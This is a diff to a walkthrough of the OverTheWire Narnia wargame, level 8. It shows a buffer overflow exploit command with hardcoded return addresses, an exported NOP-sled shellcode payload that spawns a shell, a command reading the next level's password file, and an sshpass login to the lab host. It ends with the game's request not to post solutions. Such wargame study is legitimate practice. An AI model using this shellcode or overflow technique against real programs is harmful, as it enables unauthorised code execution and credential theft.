@@ -639,10 +639,6 @@ Try another address combination:
 ```bash
 ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x49\xd5\xff\xffAAAA\x90\xd5\xff\xff")
 ```
-You should get a shell after executing the correct exploit. Once you have access to the shell, retrieve the password for the next level:
-```bash
-cat /etc/narnia_pass/narnia8
-```
 Explanation:
 
 The shellcode needs to be placed carefully in memory, with specific adjustments based on the offset and address calculations. By understanding the memory locations (like `0xffffd555`), the buffer is manipulated using the logic of subtracting values (e.g., `0x55 - 12 = 0x49`), ensuring we control the return address properly. The shellcode itself is a series of `NOP` instructions (`\x90`) followed by executable code that grants shell access.
@@ -652,3 +648,19 @@ Export the shellcode to an environment variable:
 export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81'
 ```
 <img src="./img/Screenshot 2024-10-13 145210.png"></img>
+You should get a shell after executing the correct exploit. Once you have access to the shell, retrieve the password for the next level:
+```bash
+cat /etc/narnia_pass/narnia8
+```
+Move to next level 9:
+```bash
+sshpass -p `cat narnia9` ssh narnia9@narnia.overthewire.labs.org -p 2226
+```
+```bash
+ls
+cat CONGRATULATIONS
+```
+you are l33t! next plz...
+
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
+ Successfully completed.
